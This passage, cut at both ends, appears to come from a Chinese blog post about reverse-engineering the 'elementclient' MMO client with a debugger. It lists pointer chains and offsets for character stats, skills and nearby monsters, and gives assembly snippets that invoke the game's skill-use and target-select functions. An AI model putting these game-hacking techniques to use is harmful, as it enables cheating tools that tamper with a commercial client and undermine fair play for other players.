class=\"line\">00BF0540             | 8B41 08               | mov eax,dword ptr ds:[ecx+8]          |</span><br><span class=\"line\">00BF0543             | 8B40 30               | mov eax,dword ptr ds:[eax+30]         |</span><br><span class=\"line\">当前血量 = [[[ecx+8]+30] + 78C]     ecx = 0648E5A0</span><br><span class=\"line\"></span><br><span class=\"line\">00BE5869             | FF50 34               | call dword ptr ds:[eax+34]            |</span><br><span class=\"line\"></span><br><span class=\"line\">00A4B8AE             | E8 4D9F1900           | call elementclient.BE5800             |</span><br><span class=\"line\"></span><br><span class=\"line\">00A4B89A             | 8B4F 30               | mov ecx,dword ptr ds:[edi+30]         |</span><br><span class=\"line\">当前血量 = [[[0150B6FC]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 78C 为血量</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 7E4 为血量上限</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 790 为真气</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 7E8 为真气上限</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 784 为等级</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 794 为经验</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 798 为元神</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 79C 为元气上限</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 7A0 为真元</span><br><span class=\"line\"></span><br><span class=\"line\">$ + B00 / $ + B04 为角色姓名</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 864 为最大真元</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 930 为银币</span><br><span class=\"line\"></span><br><span class=\"line\">$ +7A0/864+8FC  为  99/100</span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">2.人物技能call</span><br><span class=\"line\">009ADDF5             | FF75 14               | push dword ptr ss:[ebp+14]            | 0019EE7C</span><br><span class=\"line\">009ADDF8             | C701 00000000         | mov dword ptr ds:[ecx],0              | [1DC7CDB8]</span><br><span class=\"line\">009ADDFE             | FF75 10               | push dword ptr ss:[ebp+10]            | 1 </span><br><span class=\"line\">009ADE01             | FF75 0C               | push dword ptr ss:[ebp+C]             | 01518200</span><br><span class=\"line\">009ADE04             | FF75 08               | push dword ptr ss:[ebp+8]             | 0000007D</span><br><span class=\"line\">009ADE07             | E8 84803100           | call elementclient.CC5E90             |</span><br><span class=\"line\"></span><br><span class=\"line\">00B43CB2             | 50                    | push eax                              | 0019EE7C</span><br><span class=\"line\">00B43CB3             | 8B87 00280000         | mov eax,dword ptr ds:[edi+2800]       | 43336E60</span><br><span class=\"line\">00B43CB9             | 6A 01                 | push 1                                | 1</span><br><span class=\"line\">00B43CBB             | FF75 C8               | push dword ptr ss:[ebp-38]            | 181E4F00</span><br><span class=\"line\">00B43CBE             | FF70 08               | push dword ptr ds:[eax+8]             | 0000007D</span><br><span class=\"line\">00B43CC1             | A1 20205001           | mov eax,dword ptr ds:[1502020]        | 0150B6E0</span><br><span class=\"line\">00B43CC6             | 8B48 20               | mov ecx,dword ptr ds:[eax+20]         | 1DEB6028</span><br><span class=\"line\">00B43CC9             | 81C1 EC000000         | add ecx,EC                            | </span><br><span class=\"line\">00B43CCF             | E8 ECA0E6FF           | call elementclient.9ADDC0             |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00CEB35C - 8B 43 08  - mov eax,[ebx+08]</span><br><span class=\"line\">00CEB35C             | 8B43 08               | mov eax,dword ptr ds:[ebx+8]          | 43336E60</span><br><span class=\"line\">00CEB35F             | 8B11                  | mov edx,dword ptr ds:[ecx]            | 012787BC</span><br><span class=\"line\">00CEB361             | 6A FF                 | push FFFFFFFF                         |</span><br><span class=\"line\">00CEB363             | 6A 00                 | push 0                                |</span><br><span class=\"line\">00CEB365             | 6A 00                 | push 0                                |</span><br><span class=\"line\">00CEB367             | FF70 08               | push dword ptr ds:[eax+8]             | 0000007D</span><br><span class=\"line\">00CEB36A             | 8B42 0C               | mov eax,dword ptr ds:[edx+C]          | 0096B5A0</span><br><span class=\"line\">00CEB36D             | FFD0                  | call eax                              |</span><br><span class=\"line\"></span><br><span class=\"line\">00CEB373 - 8B 43 08  - mov eax,[ebx+08]</span><br><span class=\"line\">00CEB373             | 8B43 08               | mov eax,dword ptr ds:[ebx+8]          | 43336E60</span><br><span class=\"line\">00CEB376             | 8BCE                  | mov ecx,esi                           | 5EB45680</span><br><span class=\"line\">00CEB378             | 6A FF                 | push FFFFFFFF                         |</span><br><span class=\"line\">00CEB37A             | 6A 00                 | push 0                                |</span><br><span class=\"line\">00CEB37C             | 6A 00                 | push 0                                |</span><br><span class=\"line\">00CEB37E             | FF70 08               | push dword ptr ds:[eax+8]             | 0000007D</span><br><span class=\"line\">00CEB381             | E8 FA38E5FF           | call elementclient.B3EC80             |</span><br><span class=\"line\"></span><br><span class=\"line\">00CEB2D7             | 8B70 30               | mov esi,dword ptr ds:[eax+30]         |</span><br><span class=\"line\">esi = [eax + 30]</span><br><span class=\"line\">00CEB2D4             | 8B40 1C               | mov eax,dword ptr ds:[eax+1C]         |</span><br><span class=\"line\">esi = [[eax+1C] + 30]</span><br><span class=\"line\">00CEB2CA             | A1 20205001           | mov eax,dword ptr ds:[1502020]        |</span><br><span class=\"line\">esi = [[[1502020] + 1C] + 30]</span><br><span class=\"line\"></span><br><span class=\"line\">mov ecx,1502020</span><br><span class=\"line\">mov ecx,[ecx]</span><br><span class=\"line\">mov ecx,[ecx+1C]</span><br><span class=\"line\">mov ecx,[ecx+30]</span><br><span class=\"line\">push  -1</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 7D</span><br><span class=\"line\">call 0x0B3EC80</span><br><span class=\"line\"></span><br><span class=\"line\">3.人物选中call</span><br><span class=\"line\">009AE200 - 89 B0 04090000  - mov [eax+00000904],esi</span><br><span class=\"line\">00B55402             | A1 20205001           | mov eax,dword ptr ds:[1502020]        |</span><br><span class=\"line\">00B55407             | 56                    | push esi                              | 80001A0B</span><br><span class=\"line\">00B55408             | 8B48 20               | mov ecx,dword ptr ds:[eax+20]         |</span><br><span class=\"line\">00B5540B             | 81C1 EC000000         | add ecx,EC                            |</span><br><span class=\"line\">00B55411             | E8 BA8DE5FF           | call elementclient.9AE1D0             |</span><br><span class=\"line\"></span><br><span class=\"line\">mov eax,dword ptr ds:[1502020]</span><br><span class=\"line\">push 80001C4A</span><br><span class=\"line\">mov ecx,dword ptr ds:[eax+20] </span><br><span class=\"line\">add ecx,0x0EC        </span><br><span class=\"line\">call 9AE1D0     </span><br><span class=\"line\"></span><br><span class=\"line\">//通过寻找上一层的代码确定call</span><br><span class=\"line\"></span><br><span class=\"line\">4.人物技能分析</span><br><span class=\"line\">00CEB37E             | FF70 08               | push dword ptr ds:[eax+8]             |</span><br><span class=\"line\">eax = 4483FFB0</span><br><span class=\"line\"></span><br><span class=\"line\">41930A50  47B991C0 À.¹G </span><br><span class=\"line\">41930A54  4483FE28 (þ.D </span><br><span class=\"line\">41930A58  4483FFB0 °ÿ.D </span><br><span class=\"line\">41930A5C  44832800 .(.D </span><br><span class=\"line\">41930A60  4483FD10 .ý.D </span><br><span class=\"line\"></span><br><span class=\"line\">47B991C0 01299498 ..). </span><br><span class=\"line\">47B991C4 30F749F0 ðI÷0 </span><br><span class=\"line\">47B991C8 00000071 q... </span><br><span class=\"line\">47B991CC 00000005 .... </span><br><span class=\"line\">47B991D0 00000000 .... </span><br><span class=\"line\"></span><br><span class=\"line\">30F749F0 1046E60C .æF. </span><br><span class=\"line\">30F749F4 10833F48 H?.. </span><br><span class=\"line\">30F749F8 00000000 .... </span><br><span class=\"line\">30F749FC 00000000 .... </span><br><span class=\"line\"></span><br><span class=\"line\">10833F48 105450F8 øPT. elementskill.&amp;?GetRequiredGenius@ElementSkill@GNET@@UAEPAHH@Z</span><br><span class=\"line\">10833F4C 00000071 q... </span><br><span class=\"line\">10833F50 00000007 .... </span><br><span class=\"line\">10833F54 10545150 PQT. L&quot;清心咒&quot;</span><br><span class=\"line\">10833F58 10545158 XQT. &quot;清心咒&quot;</span><br><span class=\"line\">10833F5C 10545160 `QT. &quot;清心咒.dds&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">10545150 清心咒</span><br><span class=\"line\"></span><br><span class=\"line\">2CAC0CF8 - [[[0150B6FC]+30] = 2CAC0CF8 - 2CABE4D8 = 2820</span><br><span class=\"line\">[[[0150B6FC]+30]+2820]   //即可得到技能列表首地址</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">5.周围怪物列表</span><br><span class=\"line\">00BE8626 - 89 88 2C010000  - mov [eax+0000012C],ecx</span><br><span class=\"line\"></span><br><span class=\"line\">00BE8615   &gt; \\8B72 0C       mov esi,dword ptr ds:[edx+0xC]           ;  Case 21 of switch 00BE84E0</span><br><span class=\"line\">00BE8618   .  FF36          push dword ptr ds:[esi]       </span><br><span class=\"line\">00BE861A   .  E8 F10D0000   call ElementC.00BE9410</span><br><span class=\"line\">00BE861F   .  85C0          test eax,eax</span><br><span class=\"line\">00BE8621   .  74 60         je XElementC.00BE8683</span><br><span class=\"line\">00BE8623   .  8B4E 04       mov ecx,dword ptr ds:[esi+0x4]</span><br><span class=\"line\">00BE8626   .  8988 2C010000 mov dword ptr ds:[eax+0x12C],ecx</span><br><span class=\"line\">00BE862C   .  8B4E 08       mov ecx,dword ptr ds:[esi+0x8]</span><br><span class=\"line\">00BE862F   .  8988 84010000 mov dword ptr ds:[eax+0x184],ecx</span><br><span class=\"line\">00BE8635   .  8B4E 0C       mov ecx,dword ptr ds:[esi+0xC]</span><br><span class=\"line\">00BE8638   .  5F            pop edi</span><br><span class=\"line\">00BE8639   .  5E            pop esi</span><br><span class=\"line\">00BE863A   .  8988 0C020000 mov dword ptr ds:[eax+0x20C],ecx</span><br><span class=\"line\"></span><br><span class=\"line\">00BF4E10   $  55            push ebp</span><br><span class=\"line\">00BF4E11   .  8BEC          mov ebp,esp</span><br><span class=\"line\">00BF4E13   .  8B45 0C       mov eax,dword ptr ss:[ebp+0xC]</span><br><span class=\"line\">00BF4E16   .  33D2          xor edx,edx</span><br><span class=\"line\">00BF4E18   .  56            push esi</span><br><span class=\"line\">00BF4E19   .  8B30          mov esi,dword ptr ds:[eax]     80001C4A</span><br><span class=\"line\">00BF4E1B   .  8BC6          mov eax,esi</span><br><span class=\"line\">00BF4E1D   .  F771 14       div dword ptr ds:[ecx+0x14]    ecx = 0A345DEC</span><br><span class=\"line\">00BF4E20   .  8B41 08       mov eax,dword ptr ds:[ecx+0x8]    51A10448</span><br><span class=\"line\">00BF4E23   .  8B0490        mov eax,dword ptr ds:[eax+edx*4]  41AEC578 edx=000002CB</span><br><span class=\"line\">00BF4E26   .  85C0          test eax,eax</span><br><span class=\"line\"></span><br><span class=\"line\">00BE9421  |.  8D4E 14       lea ecx,dword ptr ds:[esi+0x14]</span><br><span class=\"line\">ecx = [esi+0x14] = [ecx + 0x14] = [[eax+2*4+0x1C] + 0x14] = [[[[esi+0x4]+0x1C]+2*4+0x1C] + 0x14] = [[[[ecx+0x4]+0x1C]+2*4+0x1C] + 0x14] = [[[[[0150B6FC]+0x98]+0x4]+0x1C]+2*4+0x1C] + 0x14</span><br><span class=\"line\"></span><br><span class=\"line\">eax = [eax+edx*4] = 41AEC578</span><br><span class=\"line\"></span><br><span class=\"line\">41AEC578  00000000</span><br><span class=\"line\">41AEC57C  2D9E78D0</span><br><span class=\"line\">41AEC580  80001C4A</span><br><span class=\"line\"></span><br><span class=\"line\">2D9E78D0  01282E8C  ElementC.01282E8C</span><br><span class=\"line\">2D9E78D4  00000012</span><br><span class=\"line\">2D9E78D8  01518328  ElementC.01518328</span><br><span class=\"line\">2D9E78DC  3F7F4E6D</span><br><span class=\"line\">2D9E78E0  80000000</span><br><span class=\"line\">2D9E78E4  3D96A916</span><br><span class=\"line\">2D9E78E8  00000000</span><br><span class=\"line\">2D9E78EC  00000000</span><br><span class=\"line\">2D9E78F0  3F800000</span><br><span class=\"line\">2D9E78F4  00000000</span><br><span class=\"line\">2D9E78F8  00000000</span><br><span class=\"line\">2D9E78FC  BD96A917</span><br><span class=\"line\">2D9E7900  00000000</span><br><span class=\"line\">2D9E7904  3F7F4E6F</span><br><span class=\"line\">2D9E7908  00000000</span><br><span class=\"line\">2D9E790C  44339366</span><br><span class=\"line\">2D9E7910  42855E22</span><br><span class=\"line\">2D9E7914  C2B205F5</span><br><span class=\"line\">2D9E7918  3F800000</span><br><span class=\"line\">2D9E791C  3F7F4E6D</span><br><span class=\"line\">2D9E7920  80000000</span><br><span class=\"line\">2D9E7924  3D96A916</span><br><span class=\"line\">2D9E7928  00000000</span><br><span class=\"line\">2D9E792C  00000000</span><br><span class=\"line\">2D9E7930  3F800000</span><br><span class=\"line\">2D9E7934  00000000</span><br><span class=\"line\">2D9E7938  00000000</span><br><span class=\"line\">2D9E793C  BD96A917</span><br><span class=\"line\">2D9E7940  00000000</span><br><span class=\"line\">2D9E7944  3F7F4E6F</span><br><span class=\"line\">2D9E7948  00000000</span><br><span class=\"line\">2D9E794C  44339366</span><br><span class=\"line\">2D9E7950  42855E22</span><br><span class=\"line\">2D9E7954  C2B205F5</span><br><span class=\"line\">2D9E7958  3F800000</span><br><span class=\"line\">2D9E795C  00000000</span><br><span class=\"line\">2D9E7960  00000000</span><br><span class=\"line\">2D9E7964  012BC8F8  ElementC.012BC8F8</span><br><span class=\"line\">2D9E7968  01248974  ElementC.01248974</span><br><span class=\"line\">2D9E797C  0000000A</span><br><span class=\"line\">2D9E7980  00000000</span><br><span class=\"line\">2D9E7984  00000006</span><br><span class=\"line\">2D9E7988  420136DA</span><br><span class=\"line\">2D9E798C  75490100  windows_.75490100</span><br><span class=\"line\">2D9E7990  00000000</span><br><span class=\"line\">2D9E7994  BD471982</span><br><span class=\"line\">2D9E7998  80000000</span><br><span class=\"line\">2D9E799C  3F7FB288</span><br><span class=\"line\">2D9E79A0  00000000</span><br><span class=\"line\">2D9E79A4  BD16C33D</span><br><span class=\"line\">2D9E79A8  80000000</span><br><span class=\"line\">2D9E79AC  3F7FD398</span><br><span class=\"line\">2D9E79B0  00000096</span><br><span class=\"line\">2D9E79B4  0000009C</span><br><span class=\"line\">2D9E79B8  0000000F</span><br><span class=\"line\">2D9E79BC  77000100  gdi32ful.77000100</span><br><span class=\"line\">2D9E79C0  BDC16CBC</span><br><span class=\"line\">2D9E79C4  3F77956C</span><br><span class=\"line\">2D9E79C8  3E71C8DE</span><br><span class=\"line\">2D9E79CC  BDC16CBC</span><br><span class=\"line\">2D9E79D0  3F77956C</span><br><span class=\"line\">2D9E79D4  3E71C8E3  ASCII &quot;s</span><br><span class=\"line\">2D9E79D8  676F4800  igc32.676F4800</span><br><span class=\"line\">2D9E79DC  01518340  ElementC.01518340</span><br><span class=\"line\">2D9E79E0  41BCBCE0</span><br><span class=\"line\">2D9E79E4  0A345DD8</span><br><span class=\"line\">2D9E79E8  80001C4A</span><br><span class=\"line\">2D9E79EC  0000AE41</span><br><span class=\"line\">2D9E79F0  0000AE41</span><br><span class=\"line\">2D9E79F4  00000010</span><br><span class=\"line\">2D9E79F8  00000000</span><br><span class=\"line\">2D9E79FC  000003BE</span><br><span class=\"line\">2D9E7A54  000003BE</span><br><span class=\"line\">2D9E7ADC  FFFFFFFF</span><br><span class=\"line\">2D9E7AE0  3F800000</span><br><span class=\"line\">2D9E7AE4  78443800</span><br><span class=\"line\">2D9E7AE8  0000000C</span><br><span class=\"line\">2D9E7B40  00001388</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$+3C     4430814B K.0D    ;x</span><br><span class=\"line\">$+40     427230F2 ò0rB    ;z</span><br><span class=\"line\">$+44     C2D852B3 ³RØÂ    ;y</span><br><span class=\"line\">$+124    00000010 ....     ;怪物等级</span><br><span class=\"line\">$+128    00000000 .... </span><br><span class=\"line\">$+12C    000003BE ¾...     ;当前血量</span><br><span class=\"line\">$+184    000003BE ¾...     ;最大血量</span><br><span class=\"line\">$+270    00001388 ....         </span><br><span class=\"line\">$+284    3E312F14 ./1&gt;      L&quot;囚徒怨魂&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"更新结束-2\"><a class=\"markdownIt-Anchor\" href=\"#更新结束-2\">#</a> 更新结束</h4>\n<p>5. 人物技能信息分析</p>\n<p>1. 每个技能所包含的数据</p>\n<p>技能名称 ID</p>\n<p>技能冷却时间</p>\n<p>可以猜想：有一个技能类，每个技能都是这个类的对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Skill</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_skillNamel</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_skillID</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_skillInterval;</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_skillLevel;</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_skillInfo;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">class skillInfo</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push [eax+0x08]    </span><br><span class=\"line\">eax = 4C270380    4AAE4A38</span><br><span class=\"line\"></span><br><span class=\"line\">46A30A60 01297268 hr). </span><br><span class=\"line\">46A30A64 49C40C18 ..ÄI </span><br><span class=\"line\">46A30A68 00000071 q... </span><br><span class=\"line\">46A30A6C 00000005 .... </span><br><span class=\"line\">46A30A70 00000000 .... </span><br><span class=\"line\">46A30A74 00000000 .... </span><br><span class=\"line\">46A30A78 000003E8 è... </span><br><span class=\"line\">46A30A7C A2B70000 ..·¢ </span><br><span class=\"line\">46A30A80 00000000 .... </span><br><span class=\"line\">46A30A84 00000000 .... </span><br><span class=\"line\">46A30A88 005F7800 .x_. </span><br><span class=\"line\">46A30A8C 00000000 .... </span><br><span class=\"line\">46A30A90 00020100 .... </span><br><span class=\"line\">46A30A94 00000000 .... </span><br><span class=\"line\">46A30A98 00000001 .... </span><br><span class=\"line\">46A30A9C 0000001E .... </span><br><span class=\"line\">46A30AA0 0000001F .... </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">4272ED50</span><br><span class=\"line\">4C270380  01297268  ElementC.01297268</span><br><span class=\"line\">4C270384  553935B0</span><br><span class=\"line\">4C270388  0000007D       技能ID</span><br><span class=\"line\">4C27038C  00000005       技能等级   C</span><br><span class=\"line\">4C270390  00000000</span><br><span class=\"line\">4C270394  00000000       冷却倒计时</span><br><span class=\"line\">4C270398  000003E8       冷却时间 1000ms</span><br><span class=\"line\">4C27039C  A2B70000</span><br><span class=\"line\">4C2703A0  00000000</span><br><span class=\"line\">4C2703A4  00000000</span><br><span class=\"line\">4C2703A8  005F7800       入口地址</span><br><span class=\"line\">4C2703AC  00000000</span><br><span class=\"line\">4C2703B0  00020100</span><br><span class=\"line\">4C2703B4  00000000</span><br><span class=\"line\"></span><br><span class=\"line\">4C27D890</span><br><span class=\"line\">4C27D890  01297268  ElementC.01297268</span><br><span class=\"line\">4C27D894  55393CB8</span><br><span class=\"line\">4C27D898  0000007F</span><br><span class=\"line\">4C27D89C  00000004</span><br><span class=\"line\">4C27D8A0  00000000</span><br><span class=\"line\">4C27D8A4  00000000   </span><br><span class=\"line\">4C27D8A8  00000BB8</span><br><span class=\"line\">4C27D8AC  D25FF800</span><br><span class=\"line\">4C27D8B0  00000000</span><br><span class=\"line\">4C27D8B4  00000000</span><br><span class=\"line\">4C27D8B8  00000000</span><br><span class=\"line\">4C27D8BC  00000000</span><br><span class=\"line\">4C27D8C0  00020100</span><br><span class=\"line\">4C27D8C4  00000000</span><br><span class=\"line\">4C27D8C8  00000001</span><br><span class=\"line\">4C27D8CC  00000019</span><br><span class=\"line\">4C27D8D0  0000001F</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>推测 00CE92DE</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">46A30A60 01297268 hr). </span><br><span class=\"line\">46A30A64 49C40C18 ..ÄI </span><br><span class=\"line\">46A30A68 00000071 q... </span><br><span class=\"line\">46A30A6C 00000005 .... </span><br><span class=\"line\">46A30A70 00000000 .... </span><br><span class=\"line\">46A30A74 00000000 .... </span><br><span class=\"line\">46A30A78 000003E8 è... </span><br><span class=\"line\">46A30A7C A2B70000 ..·¢ </span><br><span class=\"line\">46A30A80 00000000 .... </span><br><span class=\"line\">46A30A84 00000000 .... </span><br><span class=\"line\">46A30A88 005F7800 .x_. </span><br><span class=\"line\">46A30A8C 00000000 .... </span><br><span class=\"line\">46A30A90 00020100 .... </span><br><span class=\"line\">46A30A94 00000000 .... </span><br><span class=\"line\">46A30A98 00000001 .... </span><br><span class=\"line\">46A30A9C 0000001E .... </span><br><span class=\"line\">46A30AA0 0000001F .... </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">495A6148  01297268  ElementC.01297268</span><br><span class=\"line\">495A614C  605D0978</span><br><span class=\"line\">495A6150  0000007D</span><br><span class=\"line\">495A6154  00000005</span><br><span class=\"line\">495A6158  00000000</span><br><span class=\"line\">495A615C  00000000</span><br><span class=\"line\">495A6160  000003E8</span><br><span class=\"line\">495A6164  00726F00  ElementC.00726F00</span><br><span class=\"line\">495A6168  00000000</span><br><span class=\"line\">495A616C  00000000</span><br><span class=\"line\">495A6170  00000000</span><br><span class=\"line\">495A6174  00000000</span><br><span class=\"line\">495A6178  00020100</span><br><span class=\"line\">495A617C  00000000</span><br><span class=\"line\">495A6180  00030000</span><br><span class=\"line\">495A6184  00090006</span><br><span class=\"line\">495A6188  000F000C</span><br><span class=\"line\">495A618C  00190013</span><br><span class=\"line\">495A6190  0021001E</span><br><span class=\"line\">495A6194  00270024</span><br><span class=\"line\">495A6198  002C0029</span><br><span class=\"line\">495A619C  0032002F</span><br><span class=\"line\">495A61A0  003B0036</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">4272EED8 01297268 hr). </span><br><span class=\"line\">4272EEDC 49C403A8 ¨.ÄI </span><br><span class=\"line\">4272EEE0 0000007F .... </span><br><span class=\"line\">4272EEE4 00000004 .... </span><br><span class=\"line\">4272EEE8 00000000 .... </span><br><span class=\"line\">4272EEEC 00000000 .... </span><br><span class=\"line\">4272EEF0 00000BB8 ¸... </span><br><span class=\"line\">4272EEF4 00726F00 .or. </span><br><span class=\"line\">4272EEF8 00000000 .... </span><br><span class=\"line\">4272EEFC 00000000 .... </span><br><span class=\"line\">4272EF00 00000000 .... </span><br><span class=\"line\">4272EF04 00000000 .... </span><br><span class=\"line\">4272EF08 00020100 .... </span><br><span class=\"line\">4272EF0C 00000000 .... </span><br><span class=\"line\">4272EF10 01297268 hr). </span><br><span class=\"line\">4272EF14 4F3C3E50 P&gt;&lt;O </span><br><span class=\"line\">4272EF18 00000C9E .... </span><br><span class=\"line\">4272EF1C 00000001 .... </span><br><span class=\"line\">4272EF20 00000000 .... </span><br><span class=\"line\">4272EF24 00000000 .... </span><br><span class=\"line\">4272EF28 000003E8 è... </span><br><span class=\"line\">4272EF2C 00000000 .... </span><br><span class=\"line\">4272EF30 00000000 .... </span><br><span class=\"line\">4272EF34 00000000 .... </span><br><span class=\"line\">4272EF38 00000000 .... </span><br><span class=\"line\">4272EF3C 00000000 .... </span><br><span class=\"line\">4272EF40 00020100 .... </span><br><span class=\"line\">4272EF44 00000000 .... </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">495A6148  